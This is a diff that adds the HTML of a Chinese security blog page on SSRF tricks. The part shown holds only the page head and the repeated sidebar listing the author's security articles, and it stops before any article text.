@@ -1,0 +1,932 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+    <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+
+    
+      <link rel="icon" href="/kanxi.jpg">
+    
+
+    <title>
+        
+          SSRF Tricks小结 - Mi1k7ea
+        
+    </title>
+
+    <!-- Spectre.css framework -->
+    <link rel="stylesheet" href="/css/spectre.min.css">
+    <link rel="stylesheet" href="/css/spectre-exp.min.css">
+    <link rel="stylesheet" href="/css/spectre-icons.min.css">
+
+    <!-- Noto Sans TC -->
+    <link href="https://fonts.googleapis.com/css?family=Noto+Sans+TC" rel="stylesheet">
+    <!-- Noto Sans SC -->
+    <link href="https://fonts.googleapis.com/css?family=Noto+Sans+SC" rel="stylesheet">
+    <!-- Noto Sans -->
+    <link href="https://fonts.googleapis.com/css?family=Noto+Sans" rel="stylesheet">
+
+    <!-- theme css & js -->
+    <link rel="stylesheet" href="/css/book.css">
+    <script src="/js/book.js"></script>
+
+    <!-- tocbot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    
+    <!-- katex -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+
+    
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const zooming = new Zooming()
+    zooming.listen('img')
+})
+</script>
+
+</head>
+
+<body>
+
+<div class="container">
+  <div class="book-container">
+    <div class="columns">
+      <div class="column col-2 hide-lg">
+        <div class="book-sidebar">
+  <h4 class="site-meta">
+    <a href="/">Mi1k7ea</a>
+  </h4>
+  <div class="sidebar-content">
+    <p>Good Good Study</p>
+<ul>
+<li><strong><a href="/archives">归档</a></strong></li>
+</ul>
+<hr>
+<ul>
+<li><strong>Web安全</strong><ul>
+<li>Web安全基础&amp;Tricks<ul>
+<li><a href="/2019/10/14/文件上传漏洞总结/">文件上传攻击框架</a></li>
+<li><a href="/2019/10/04/CSWSH漏洞总结/">CSWSH漏洞总结</a></li>
+<li><a href="/2019/09/28/SSI注入漏洞总结/">SSI注入漏洞总结</a></li>
+<li><a href="/2019/08/20/JSONP跨域漏洞总结/">JSONP跨域漏洞总结</a></li>
+<li><a href="/2019/08/18/CORS跨域漏洞总结/">CORS跨域漏洞总结</a></li>
+<li><a href="/2020/01/04/浅析XSSI漏洞/">浅析XSSI漏洞</a></li>
+<li><a href="/2019/08/18/利用HTML注入劫持标签Bypass-CSP/">利用HTML注入劫持标签Bypass CSP</a></li>
+<li><a href="/2019/08/11/NoSQL注入之MongoDB/">NoSQL注入之MongoDB</a></li>
+<li><a href="/2019/08/10/Flash安全总结/">Flash安全总结</a></li>
+<li><a href="/2020/03/05/Redis安全小结/">Redis安全小结</a></li>
+<li><a href="/2020/02/29/SSRF-Tricks小结/">SSRF Tricks小结</a></li>
+<li><a href="/2020/01/21/CSRF-Tricks小结/">CSRF Tricks小结</a></li>
+<li><a href="/2019/08/05/利用Flash进行Json-CSRF攻击/">利用Flash进行Json CSRF攻击</a></li>
+<li><a href="/2019/07/31/SWFUpload-swf的Flash型XSS分析/">SWFUpload.swf的Flash型XSS分析</a></li>
+<li><a href="/2019/07/30/ZeroClipboard-swf的Flash型XSS分析/">ZeroClipboard.swf的Flash型XSS分析</a></li>
+<li><a href="/2019/07/28/Flash型CSRF总结/">Flash型CSRF总结</a></li>
+<li><a href="/2019/07/21/Flash型XSS小结/">Flash型XSS总结</a></li>
+<li><a href="/2019/06/30/XSS从弹框到RCE/">XSS从弹框到RCE（IE）</a></li>
+<li><a href="/2019/06/30/命令注入Bypass技巧小结/">命令注入Bypass技巧小结</a></li>
+<li><a href="/2019/06/25/浅析DOM型XSS/">浅析DOM型XSS</a></li>
+<li><a href="/2019/03/22/图片XSS小结/">图片XSS小结</a></li>
+<li><a href="/2019/02/24/CSP策略及绕过技巧小结/">CSP策略及绕过技巧小结</a></li>
+<li><a href="/2019/02/19/一些加载XSS-Payload的标签/">一些加载XSS Payload的标签</a></li>
+<li><a href="/2019/02/16/个人XSS-payload收集/">个人XSS payload收集</a></li>
+<li><a href="/2020/01/26/浅析XSSJacking/">浅析XSSJacking</a></li>
+<li><a href="/2019/01/30/常见Web漏洞类型/">常见Web漏洞类型总结</a></li>
+<li><a href="/2019/01/01/Sqli-labs-writeup/">Sqli-labs Less1-20</a></li>
+<li><a href="/2019/01/01/SQL注入写WebShell方式小结/">SQL注入写WebShell方式小结</a></li>
+</ul>
+</li>
+<li>Web安全之机器学习</li>
+<li>WriteUp Web<ul>
+<li><a href="/2019/10/20/InCTF-2019-PHP三题复现/">InCTF 2019 PHP+1,+1.5,+2.5三题复现</a></li>
+<li><a href="/2019/10/05/upload-labs-WriteUp/">Upload-Labs WriteUp</a></li>
+<li><a href="/2019/09/28/bWAPP之Cross-Origin-Resource-Sharing-AJAX/">bWAPP之Cross-Origin Resource Sharing (AJAX)</a></li>
+<li><a href="/2019/07/02/DVWA之JavaScript攻击/">DVWA之JavaScript攻击</a></li>
+<li><a href="/2019/06/27/一道Bypass正则过滤的反序列化漏洞题目/">一道Bypass正则过滤的反序列化漏洞题目</a></li>
+<li><a href="/2019/06/27/从一道CTF题看如何利用本地DTD文件实现XXE攻击/">从一道CTF题看如何通过本地DTD文件利用XXE实现回显</a></li>
+<li><a href="/2019/03/31/0CTF-Web-writeup/">0CTF Web writeup</a></li>
+<li><a href="/2019/03/29/Securinets-CTF-Web-writeup/">Securinets CTF Web writeup</a></li>
+<li><a href="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/">Teaser CONFidence CTF Web writeup</a></li>
+<li><a href="/2019/03/17/SpEL注入之javacon/">SpEL注入之javacon</a></li>
+<li><a href="/2019/03/13/AeroCTF-writeupup之board-tracking-system/">AeroCTF writeupup之board tracking system</a></li>
+<li><a href="/2019/03/09/TAMUctf-Web-writeup/">TAMUctf Web writeup</a></li>
+<li><a href="/2019/02/21/一道绕过CSP的XSS题目/">一道绕过CSP的XSS题目</a></li>
+<li><a href="/2019/02/15/XSS闯关之xss-haozi-me/">XSS闯关之xss.haozi.me</a></li>
+<li><a href="/2019/01/01/通过DVWA学习DOM型XSS/">DVWA之DOM型XSS</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>Java</strong><ul>
+<li>Java安全<ul>
+<li><a href="/2019/02/01/Java动态代理机制/">Java动态代理机制</a></li>
+<li><a href="/2019/02/01/Java反射机制/">Java反射机制</a></li>
+<li><a href="/2019/02/03/Java序列化和反序列化机制/">Java序列化和反序列化机制</a></li>
+<li><a href="/2019/09/01/Java-RMI原理与使用/">Java RMI原理与使用</a></li>
+<li><a href="/2019/11/25/（转）Java代码审计指南">（转）Java代码审计指南</a></li>
+<li><a href="/2019/11/25/（转）Java项目中常见jar包的说明">（转）Java项目中常见jar包的说明</a></li>
+<li><a href="/2019/06/09/探讨XXE防御之setFeature设置/">探讨XXE防御之setFeature设置</a></li>
+<li><a href="/2019/05/26/XML注入之SAXBuilder/">XML注入之SAXBuilder</a></li>
+<li><a href="/2019/05/26/XML注入之SAXParser/">XML注入之SAXParser</a></li>
+<li><a href="/2019/05/24/XML注入之SAXReader/">XML注入之SAXReader</a></li>
+<li><a href="/2019/02/13/XML注入之DocumentBuilder/">XML注入之DocumentBuilder与XXE攻击防御</a></li>
+<li><a href="/2019/09/15/浅析JNDI注入/">浅析JNDI注入</a></li>
+<li><a href="/2020/01/10/SpEL表达式注入漏洞总结/">SpEL表达式注入漏洞总结</a></li>
+<li><a href="/2019/12/08/浅析Java-SPI安全/">浅析Java SPI安全</a></li>
+<li><a href="/2019/02/06/Java反序列化漏洞/">Java反序列化漏洞</a></li>
+<li><a href="/2019/01/01/XMLDecoder反序列化漏洞/">Java XMLDecoder反序列化漏洞</a></li>
+<li><a href="/2019/10/21/XStream反序列化漏洞/">Java XStream反序列化漏洞</a></li>
+<li><a href="/2019/11/29/Java-SnakeYaml反序列化漏洞">Java SnakeYaml反序列化漏洞</a></li>
+<li><a href="/2019/12/07/Java-AMF3反序列化漏洞/">Java AMF3反序列化漏洞</a></li>
+<li><a href="/2020/01/25/Java-Hessian反序列化漏洞/">Java Hessian反序列化漏洞</a></li>
+<li><a href="/2019/11/13/Fastjson系列五——高版本JDK绕过及检测与防御/">Fastjson系列五——高版本JDK绕过及检测与防御</a></li>
+<li><a href="/2019/11/11/Fastjson系列四——1-2-25-1-2-47反序列化漏洞（无需开启AutoType）/">Fastjson系列四——1.2.25-1.2.47反序列化漏洞（无需开启AutoType）</a></li>
+<li><a href="/2019/11/10/Fastjson系列三——历史版本补丁绕过（需开启AutoType）/">Fastjson系列三——历史版本补丁绕过（需开启AutoType）</a></li>
+<li><a href="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/">Fastjson系列二——1.2.22-1.2.24反序列化漏洞</a></li>
+<li><a href="/2019/11/03/Fastjson系列一——反序列化漏洞基本原理/">Fastjson系列一——反序列化漏洞基本原理</a></li>
+<li><a href="/2019/11/24/Jackson系列七——其他Gadgets/">Jackson系列七——其他Gadgets与检测防御</a></li>
+<li><a href="/2019/11/24/Jackson系列六——CVE-2019-12814（基于JDOM-XSLTransformer利用链）/">Jackson系列六——CVE-2019-12814（基于JDOM XSLTransformer利用链）</a></li>
+<li><a href="/2019/11/22/Jackson系列五——CVE-2019-12384（基于logback利用链）/">Jackson系列五——CVE-2019-12384（基于logback利用链）</a></li>
+<li><a href="/2019/11/19/Jackson系列四——CVE-2019-12086（基于MiniAdmin利用链）/">Jackson系列四——CVE-2019-12086（基于MiniAdmin利用链）</a></li>
+<li><a href="/2019/11/17/Jackson系列三—CVE-2017-1748（基于ClassPathXmlApplicationContext利用链）/">Jackson系列三——CVE-2017-17485（基于ClassPathXmlApplicationContext利用链）</a></li>
+<li><a href="/2019/11/16/Jackson系列二——CVE-2017-7525（基于TemplatesImpl利用链）/">Jackson系列二——CVE-2017-7525（基于TemplatesImpl利用链）</a></li>
+<li><a href="/2019/11/13/Jackson系列一——反序列化漏洞基本原理/">Jackson系列一——反序列化漏洞基本原理</a></li>
+</ul>
+</li>
+<li>Struts2</li>
+<li>Spring<ul>
+<li><a href="/2019/01/01/Spring基础篇之基本概念/">Spring基础篇之基本概念</a></li>
+<li><a href="/2019/01/01/Spring基础篇之IoC容器/">Spring基础篇之IoC容器</a></li>
+<li><a href="/2019/01/01/Spring基础篇之Bean/">Spring基础篇之Bean</a></li>
+<li><a href="/2019/01/01/Spring基础篇之DI（依赖注入）/">Spring基础篇之DI（依赖注入）</a></li>
+<li><a href="/2019/01/01/Spring基础篇之Bean装配/">Spring基础篇之Bean装配</a></li>
+<li><a href="/2019/01/01/Spring基础篇之AOP/">Spring基础篇之AOP</a></li>
+<li><a href="/2019/01/01/Spring基础篇之JDBC框架/">Spring基础篇之JDBC框架</a></li>
+<li><a href="/2019/01/01/Spring基础篇之事务管理/">Spring基础篇之事务管理</a></li>
+<li><a href="/2020/01/16/Spring-MVC笔记/">Spring MVC笔记</a></li>
+<li><a href="/2020/02/12/浅析自动绑定漏洞之Spring-MVC/">浅析自动绑定漏洞之Spring MVC</a></li>
+<li><a href="/2019/09/02/由JNDI注入导致的Spring-Framework反序列化漏洞/">由JNDI注入引发的Spring Framework反序列化漏洞</a></li>
+<li><a href="/2019/04/05/Spring-Data-Rest之cve-2017-8046分析/">浅析Spring Data Rest之CVE-2017-8046</a></li>
+<li><a href="/2020/02/03/浅析Spring-Data-Commons之CVE-2018-1273/">浅析Spring Data Commons之CVE-2018-1273</a></li>
+<li><a href="/2020/02/08/浅析Spring-Messaging之CVE-2018-1270/">浅析Spring Messaging之CVE-2018-1270</a></li>
+<li><a href="/2020/02/09/浅析Spring-WebFlow之CVE-2017-4971/">浅析Spring Web Flow之CVE-2017-4971</a></li>
+<li><a href="/2020/02/09/浅析Spring-Security-OAuth2之CVE-2016-4977/">浅析Spring Security OAuth2之CVE-2016-4977</a></li>
+</ul>
+</li>
+<li>SpringCloud</li>
+</ul>
+</li>
+<li><strong>PHP</strong><ul>
+<li>PHP安全<ul>
+<li><a href="/2019/08/25/浅谈PHP-FPM安全/">浅谈PHP-FPM安全</a></li>
+<li><a href="/2019/08/03/从蚁剑插件看利用PHP-FPM绕过disable-functions/">从蚁剑插件看利用PHP-FPM绕过disable_functions</a></li>
+<li><a href="/2019/07/20/浅谈几种Bypass-open-basedir的方法/">浅谈几种Bypass open_basedir的方法</a></li>
+<li><a href="/2019/07/16/PHP中mail-函数安全问题与防御/">PHP中mail()函数安全问题与防御</a></li>
+<li><a href="/2019/07/04/浅谈escapeshellarg与参数注入/">浅谈escapeshellarg逃逸与参数注入</a></li>
+<li><a href="/2019/07/02/浅析preg-replace与preg-match/">浅析preg_replace与preg_match</a></li>
+<li><a href="/2019/06/21/PHP弱类型小结/">PHP弱类型及相关函数Bypass小结</a></li>
+<li><a href="/2019/06/20/PHP变量覆盖漏洞/">PHP变量覆盖漏洞小结</a></li>
+<li><a href="/2019/06/09/巧用get-defined-functions隐藏WebShell/">巧用get_defined_functions隐藏WebShell</a></li>
+<li><a href="/2019/06/07/从一道题看PHP7-4的FFI绕过disable-functions/">从RCTF nextphp看PHP7.4的FFI绕过disable_functions</a></li>
+<li><a href="/2019/06/02/浅谈几种Bypass-disable-functions的方法/">浅谈几种Bypass disable_functions的方法</a></li>
+<li><a href="/2019/05/04/PHP对象注入之pop链构造/">PHP对象注入之pop链构造</a></li>
+<li><a href="/2019/04/21/PHP-session反序列化漏洞/">PHP session反序列化漏洞</a></li>
+<li><a href="/2019/01/31/PHP伪协议/">PHP伪协议</a></li>
+<li><a href="/2019/01/01/phar反序列化漏洞/">phar反序列化漏洞</a></li>
+<li><a href="/2019/01/01/Windows下的一种PHP隐蔽后门姿势/">Windows下的一种PHP隐藏后门姿势</a></li>
+<li><a href="/2019/01/01/PHP反序列化漏洞/">PHP unserialize反序列化漏洞</a></li>
+<li><a href="/2019/01/01/PHP内存型木马/">PHP内存型木马</a></li>
+</ul>
+</li>
+<li>CMS<ul>
+<li><a href="/2019/01/02/PHP代码审计实战之盾灵CMS/">PHP代码审计实战之盾灵CMS</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>Python</strong><ul>
+<li>Python安全<ul>
+<li><a href="/2019/06/02/浅析Python-Flask-SSTI/">浅析Python Flask SSTI</a></li>
+<li><a href="/2019/05/31/Python沙箱逃逸小结/">Python沙箱逃逸小结</a></li>
+<li><a href="/2019/01/01/PyYAML反序列化漏洞/">Python PyYAML反序列化漏洞</a></li>
+<li><a href="/2019/01/01/cPickle反序列化漏洞/">Python cPickle反序列化漏洞</a></li>
+<li><a href="/2020/03/09/Python-urllib-CRLF注入漏洞小结/">Python urllib CRLF注入漏洞小结</a></li>
+</ul>
+</li>
+<li>安全开发<ul>
+<li><a href="/2019/06/30/AWD文件监控脚本/">AWD文件监控脚本</a></li>
+<li><a href="/2019/01/01/Python安全小工具之反编译pyc文件/">Python安全小工具之反编译pyc文件</a></li>
+</ul>
+</li>
+<li>爬虫</li>
+<li>Django</li>
+</ul>
+</li>
+<li><strong>JavaScript</strong><ul>
+<li>JavaScript安全<ul>
+<li><a href="/2019/10/20/浅析JavaScript原型链污染攻击/">浅析JavaScript原型链污染攻击</a></li>
+</ul>
+</li>
+<li>NodeJS</li>
+<li>AngularJS</li>
+</ul>
+</li>
+<li><strong>GO</strong><ul>
+<li>GO安全<ul>
+<li><a href="/2020/01/01/浅析Influxdb认证绕过漏洞/">浅析Influxdb认证绕过漏洞</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>二进制安全</strong><ul>
+<li>二进制基础<ul>
+<li><a href="/2019/05/24/GOT表-PLT表与动态链接/">ELF动态链接,PLT和GOT</a></li>
+<li><a href="/2019/04/27/堆基础/">堆基础</a></li>
+<li><a href="/2019/04/15/ELF二进制格式/">ELF二进制格式</a></li>
+<li><a href="/2019/03/03/栈及栈帧/">栈基础</a></li>
+<li><a href="/2019/02/09/ELF安全防御机制小结/">ELF安全防御机制小结</a></li>
+<li><a href="/2019/01/28/IA-32寄存器/">IA-32（Intel Architecture 32位）寄存器</a></li>
+<li><a href="/2019/01/01/Linux环境与相关工具/">Linux环境与相关工具</a></li>
+</ul>
+</li>
+<li>C/C++<ul>
+<li><a href="/2019/03/24/C编写实现Linux反弹shell/">C编写实现Linux反弹shell</a></li>
+</ul>
+</li>
+<li>逆向工程</li>
+<li>Fuzzing</li>
+<li>Pwn<ul>
+<li><a href="/2019/04/20/花式栈溢出之stack-pivoting/">花式栈溢出之stack pivoting</a></li>
+<li><a href="/2019/04/12/中级ROP之ret2csu/">栈溢出之ret2csu</a></li>
+<li><a href="/2019/04/09/蒸米ROP学习笔记/">蒸米32位及64位ROP笔记</a></li>
+<li><a href="/2019/04/07/pwntools笔记/">pwntools笔记</a></li>
+<li><a href="/2019/03/23/花式栈溢出之Stack-smash/">花式栈溢出之Stack smash</a></li>
+<li><a href="/2019/03/05/栈溢出之ret2libc/">栈溢出之ret2libc</a></li>
+<li><a href="/2019/03/03/栈溢出之ret2syscall/">栈溢出之ret2syscall</a></li>
+<li><a href="/2019/03/03/栈溢出之ret2shellcode/">栈溢出之ret2shellcode</a></li>
+<li><a href="/2019/03/03/ROP之ret2text/">ROP基础及栈溢出之ret2text</a></li>
+<li><a href="/2019/03/03/栈溢出基本原理/">栈溢出基本原理</a></li>
+</ul>
+</li>
+<li>WriteUp Pwn<ul>
+<li><a href="/2019/03/08/TAMUctf-Pwn-writeup/">TAMUctf Pwn writeup</a></li>
+</ul>
+</li>
+<li>WriteUp Reverse<ul>
+<li><a href="/2019/01/01/HITB_Binary_100_writeup/">HITB Binary 100 writeup</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>渗透测试</strong><ul>
+<li>基础&amp;Tricks</li>
+<li>Kali</li>
+<li>Metasploit</li>
+<li>内网渗透<ul>
+<li><a href="/2020/02/15/内网渗透基础/">内网渗透基础与域环境搭建</a></li>
+<li><a href="/2020/02/18/Windows-PowerShell基础/">内网渗透之Windows PowerShell基础</a></li>
+<li><a href="/2020/02/27/内网信息收集之本机信息收集/">内网信息收集之本机信息收集</a></li>
+<li><a href="/2020/03/08/内网信息收集之域相关信息收集/">内网信息收集之域相关信息收集</a></li>
+</ul>
+</li>
+<li>提权<ul>
+<li><a href="/2019/01/01/关于本地提权的学习笔记（一）：Administrator提权到System">Administrator提权到System</a></li>
+<li><a href="/2019/01/01/关于本地提权的学习笔记（二）：注入进程和利用漏洞提权">注入进程和利用漏洞提权</a></li>
+</ul>
+</li>
+<li>免杀</li>
+<li>工具</li>
+</ul>
+</li>
+<li><strong>OS</strong><ul>
+<li>Windows<ul>
+<li><a href="/2019/01/01/将Python脚本转换为exe">将Python脚本转换为exe</a></li>
+<li><a href="/2019/01/01/几个查看用户信息的Windows程序">几个查看用户信息的Windows程序</a></li>
+</ul>
+</li>
+<li>Linux</li>
+</ul>
+</li>
+</ul>
+
+  </div>
+</div>
+
+<script src="/js/book-sidebar.js"></script>
+
+<script>
+collapse_sidebar(2)
+highlight_tab()
+show_sidebar()
+</script>
+      </div>
+
+      <div class="column col-8 col-lg-12">
+        <div class="book-content">
+          <div class="book-navbar">
+  <header class="navbar">
+  <section class="navbar-section">
+    <img class="navbar-icon" src="/kanxi.jpg">
+  </section>
+  <section class="navbar-center">
+    Mi1k7ea
+  </section>
+  <section class="navbar-section">
+    <label class="accordion-header c-hand" for="accordion-sidebar">
+      <i class="icon icon-menu"></i>
+    </label>
+  </section>
+</header>
+
+<div class="accordion">
+  <input type="checkbox" id="accordion-sidebar" name="accordion-checkbox" hidden>
+  <div class="accordion-body">
+    <p>Good Good Study</p>
+<ul>
+<li><strong><a href="/archives">归档</a></strong></li>
+</ul>
+<hr>
+<ul>
+<li><strong>Web安全</strong><ul>
+<li>Web安全基础&amp;Tricks<ul>
+<li><a href="/2019/10/14/文件上传漏洞总结/">文件上传攻击框架</a></li>
+<li><a href="/2019/10/04/CSWSH漏洞总结/">CSWSH漏洞总结</a></li>
+<li><a href="/2019/09/28/SSI注入漏洞总结/">SSI注入漏洞总结</a></li>
+<li><a href="/2019/08/20/JSONP跨域漏洞总结/">JSONP跨域漏洞总结</a></li>
+<li><a href="/2019/08/18/CORS跨域漏洞总结/">CORS跨域漏洞总结</a></li>
+<li><a href="/2020/01/04/浅析XSSI漏洞/">浅析XSSI漏洞</a></li>
+<li><a href="/2019/08/18/利用HTML注入劫持标签Bypass-CSP/">利用HTML注入劫持标签Bypass CSP</a></li>
+<li><a href="/2019/08/11/NoSQL注入之MongoDB/">NoSQL注入之MongoDB</a></li>
+<li><a href="/2019/08/10/Flash安全总结/">Flash安全总结</a></li>
+<li><a href="/2020/03/05/Redis安全小结/">Redis安全小结</a></li>
+<li><a href="/2020/02/29/SSRF-Tricks小结/">SSRF Tricks小结</a></li>
+<li><a href="/2020/01/21/CSRF-Tricks小结/">CSRF Tricks小结</a></li>
+<li><a href="/2019/08/05/利用Flash进行Json-CSRF攻击/">利用Flash进行Json CSRF攻击</a></li>
+<li><a href="/2019/07/31/SWFUpload-swf的Flash型XSS分析/">SWFUpload.swf的Flash型XSS分析</a></li>
+<li><a href="/2019/07/30/ZeroClipboard-swf的Flash型XSS分析/">ZeroClipboard.swf的Flash型XSS分析</a></li>
+<li><a href="/2019/07/28/Flash型CSRF总结/">Flash型CSRF总结</a></li>
+<li><a href="/2019/07/21/Flash型XSS小结/">Flash型XSS总结</a></li>
+<li><a href="/2019/06/30/XSS从弹框到RCE/">XSS从弹框到RCE（IE）</a></li>
+<li><a href="/2019/06/30/命令注入Bypass技巧小结/">命令注入Bypass技巧小结</a></li>
+<li><a href="/2019/06/25/浅析DOM型XSS/">浅析DOM型XSS</a></li>
+<li><a href="/2019/03/22/图片XSS小结/">图片XSS小结</a></li>
+<li><a href="/2019/02/24/CSP策略及绕过技巧小结/">CSP策略及绕过技巧小结</a></li>
+<li><a href="/2019/02/19/一些加载XSS-Payload的标签/">一些加载XSS Payload的标签</a></li>
+<li><a href="/2019/02/16/个人XSS-payload收集/">个人XSS payload收集</a></li>
+<li><a href="/2020/01/26/浅析XSSJacking/">浅析XSSJacking</a></li>
+<li><a href="/2019/01/30/常见Web漏洞类型/">常见Web漏洞类型总结</a></li>
+<li><a href="/2019/01/01/Sqli-labs-writeup/">Sqli-labs Less1-20</a></li>
+<li><a href="/2019/01/01/SQL注入写WebShell方式小结/">SQL注入写WebShell方式小结</a></li>
+</ul>
+</li>
+<li>Web安全之机器学习</li>
+<li>WriteUp Web<ul>
+<li><a href="/2019/10/20/InCTF-2019-PHP三题复现/">InCTF 2019 PHP+1,+1.5,+2.5三题复现</a></li>
+<li><a href="/2019/10/05/upload-labs-WriteUp/">Upload-Labs WriteUp</a></li>
+<li><a href="/2019/09/28/bWAPP之Cross-Origin-Resource-Sharing-AJAX/">bWAPP之Cross-Origin Resource Sharing (AJAX)</a></li>
+<li><a href="/2019/07/02/DVWA之JavaScript攻击/">DVWA之JavaScript攻击</a></li>
+<li><a href="/2019/06/27/一道Bypass正则过滤的反序列化漏洞题目/">一道Bypass正则过滤的反序列化漏洞题目</a></li>
+<li><a href="/2019/06/27/从一道CTF题看如何利用本地DTD文件实现XXE攻击/">从一道CTF题看如何通过本地DTD文件利用XXE实现回显</a></li>
+<li><a href="/2019/03/31/0CTF-Web-writeup/">0CTF Web writeup</a></li>
+<li><a href="/2019/03/29/Securinets-CTF-Web-writeup/">Securinets CTF Web writeup</a></li>
+<li><a href="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/">Teaser CONFidence CTF Web writeup</a></li>
+<li><a href="/2019/03/17/SpEL注入之javacon/">SpEL注入之javacon</a></li>
+<li><a href="/2019/03/13/AeroCTF-writeupup之board-tracking-system/">AeroCTF writeupup之board tracking system</a></li>
+<li><a href="/2019/03/09/TAMUctf-Web-writeup/">TAMUctf Web writeup</a></li>
+<li><a href="/2019/02/21/一道绕过CSP的XSS题目/">一道绕过CSP的XSS题目</a></li>
+<li><a href="/2019/02/15/XSS闯关之xss-haozi-me/">XSS闯关之xss.haozi.me</a></li>
+<li><a href="/2019/01/01/通过DVWA学习DOM型XSS/">DVWA之DOM型XSS</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>Java</strong><ul>
+<li>Java安全<ul>
+<li><a href="/2019/02/01/Java动态代理机制/">Java动态代理机制</a></li>
+<li><a href="/2019/02/01/Java反射机制/">Java反射机制</a></li>
+<li><a href="/2019/02/03/Java序列化和反序列化机制/">Java序列化和反序列化机制</a></li>
+<li><a href="/2019/09/01/Java-RMI原理与使用/">Java RMI原理与使用</a></li>
+<li><a href="/2019/11/25/（转）Java代码审计指南">（转）Java代码审计指南</a></li>
+<li><a href="/2019/11/25/（转）Java项目中常见jar包的说明">（转）Java项目中常见jar包的说明</a></li>
+<li><a href="/2019/06/09/探讨XXE防御之setFeature设置/">探讨XXE防御之setFeature设置</a></li>
+<li><a href="/2019/05/26/XML注入之SAXBuilder/">XML注入之SAXBuilder</a></li>
+<li><a href="/2019/05/26/XML注入之SAXParser/">XML注入之SAXParser</a></li>
+<li><a href="/2019/05/24/XML注入之SAXReader/">XML注入之SAXReader</a></li>
+<li><a href="/2019/02/13/XML注入之DocumentBuilder/">XML注入之DocumentBuilder与XXE攻击防御</a></li>
+<li><a href="/2019/09/15/浅析JNDI注入/">浅析JNDI注入</a></li>
+<li><a href="/2020/01/10/SpEL表达式注入漏洞总结/">SpEL表达式注入漏洞总结</a></li>
+<li><a href="/2019/12/08/浅析Java-SPI安全/">浅析Java SPI安全</a></li>
+<li><a href="/2019/02/06/Java反序列化漏洞/">Java反序列化漏洞</a></li>
+<li><a href="/2019/01/01/XMLDecoder反序列化漏洞/">Java XMLDecoder反序列化漏洞</a></li>
+<li><a href="/2019/10/21/XStream反序列化漏洞/">Java XStream反序列化漏洞</a></li>
+<li><a href="/2019/11/29/Java-SnakeYaml反序列化漏洞">Java SnakeYaml反序列化漏洞</a></li>
+<li><a href="/2019/12/07/Java-AMF3反序列化漏洞/">Java AMF3反序列化漏洞</a></li>
+<li><a href="/2020/01/25/Java-Hessian反序列化漏洞/">Java Hessian反序列化漏洞</a></li>
+<li><a href="/2019/11/13/Fastjson系列五——高版本JDK绕过及检测与防御/">Fastjson系列五——高版本JDK绕过及检测与防御</a></li>
+<li><a href="/2019/11/11/Fastjson系列四——1-2-25-1-2-47反序列化漏洞（无需开启AutoType）/">Fastjson系列四——1.2.25-1.2.47反序列化漏洞（无需开启AutoType）</a></li>
+<li><a href="/2019/11/10/Fastjson系列三——历史版本补丁绕过（需开启AutoType）/">Fastjson系列三——历史版本补丁绕过（需开启AutoType）</a></li>
+<li><a href="/2019/11/07/Fastjson系列二——1-2-22-1-2-24反序列化漏洞/">Fastjson系列二——1.2.22-1.2.24反序列化漏洞</a></li>
+<li><a href="/2019/11/03/Fastjson系列一——反序列化漏洞基本原理/">Fastjson系列一——反序列化漏洞基本原理</a></li>
+<li><a href="/2019/11/24/Jackson系列七——其他Gadgets/">Jackson系列七——其他Gadgets与检测防御</a></li>
+<li><a href="/2019/11/24/Jackson系列六——CVE-2019-12814（基于JDOM-XSLTransformer利用链）/">Jackson系列六——CVE-2019-12814（基于JDOM XSLTransformer利用链）</a></li>
+<li><a href="/2019/11/22/Jackson系列五——CVE-2019-12384（基于logback利用链）/">Jackson系列五——CVE-2019-12384（基于logback利用链）</a></li>
+<li><a href="/2019/11/19/Jackson系列四——CVE-2019-12086（基于MiniAdmin利用链）/">Jackson系列四——CVE-2019-12086（基于MiniAdmin利用链）</a></li>
+<li><a href="/2019/11/17/Jackson系列三—CVE-2017-1748（基于ClassPathXmlApplicationContext利用链）/">Jackson系列三——CVE-2017-17485（基于ClassPathXmlApplicationContext利用链）</a></li>
+<li><a href="/2019/11/16/Jackson系列二——CVE-2017-7525（基于TemplatesImpl利用链）/">Jackson系列二——CVE-2017-7525（基于TemplatesImpl利用链）</a></li>
+<li><a href="/2019/11/13/Jackson系列一——反序列化漏洞基本原理/">Jackson系列一——反序列化漏洞基本原理</a></li>
+</ul>
+</li>
+<li>Struts2</li>
+<li>Spring<ul>
+<li><a href="/2019/01/01/Spring基础篇之基本概念/">Spring基础篇之基本概念</a></li>
+<li><a href="/2019/01/01/Spring基础篇之IoC容器/">Spring基础篇之IoC容器</a></li>
+<li><a href="/2019/01/01/Spring基础篇之Bean/">Spring基础篇之Bean</a></li>
+<li><a href="/2019/01/01/Spring基础篇之DI（依赖注入）/">Spring基础篇之DI（依赖注入）</a></li>
+<li><a href="/2019/01/01/Spring基础篇之Bean装配/">Spring基础篇之Bean装配</a></li>
+<li><a href="/2019/01/01/Spring基础篇之AOP/">Spring基础篇之AOP</a></li>
+<li><a href="/2019/01/01/Spring基础篇之JDBC框架/">Spring基础篇之JDBC框架</a></li>
+<li><a href="/2019/01/01/Spring基础篇之事务管理/">Spring基础篇之事务管理</a></li>
+<li><a href="/2020/01/16/Spring-MVC笔记/">Spring MVC笔记</a></li>
+<li><a href="/2020/02/12/浅析自动绑定漏洞之Spring-MVC/">浅析自动绑定漏洞之Spring MVC</a></li>
